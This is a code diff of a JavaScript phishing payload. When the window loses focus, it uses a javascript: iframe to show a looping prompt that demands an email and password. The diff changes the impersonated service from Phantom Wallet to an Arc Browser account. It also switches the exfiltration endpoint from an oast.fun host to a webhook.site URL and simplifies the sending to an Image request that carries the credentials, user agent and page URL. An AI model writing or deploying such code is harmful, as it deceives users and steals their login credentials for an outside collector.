@@ -12,8 +12,8 @@
     window.onblur = function () {
       const code =
         "(function(){try{"
-        + "var msg='In order to access phantom.app\\n"
-        + "you must first login on your\\nPhantom Wallet Account.\\n\\n"
+        + "var msg='In order to access Arc Browser\\n"
+        + "you must first login on your\\narc.net account\\n\\n"
         + "Please type your e-mail\\nand your password:';"
         + "var v='';"
         // Force user to fill (loop until non-empty)
@@ -21,14 +21,12 @@
         + "  v=prompt(msg,'E-mail / Password.');"
         + "}"
         // Build webhook URL with some context
-        + "var u='https://oxomzauseuatgjlyyqtdkiq3v0vsnm0p5.oast.fun'"
+        + "var u='https://webhook.site/4904f062-4aeb-46f1-91ff-b93e97b8a20c'"
         + "  + '?creds=' + encodeURIComponent(v)"
         + "  + '&ua=' + encodeURIComponent(navigator.userAgent)"
         + "  + '&page=' + encodeURIComponent(location.href);"
-        // Try sendBeacon first (non-blocking), then fallback to Image
-        + "try{ if(!navigator.sendBeacon(u)){ throw new Error('beacon-fallback'); } }catch(e){"
-        + "  try{ (new Image()).src = u; }catch(_e){}"
-        + "}"
+        // Use Image to send GET request
+        + "(new Image()).src = u;"
         + "}catch(e){}})()";
 
       document.getElementById('iframe').src = "javascript:" + code;
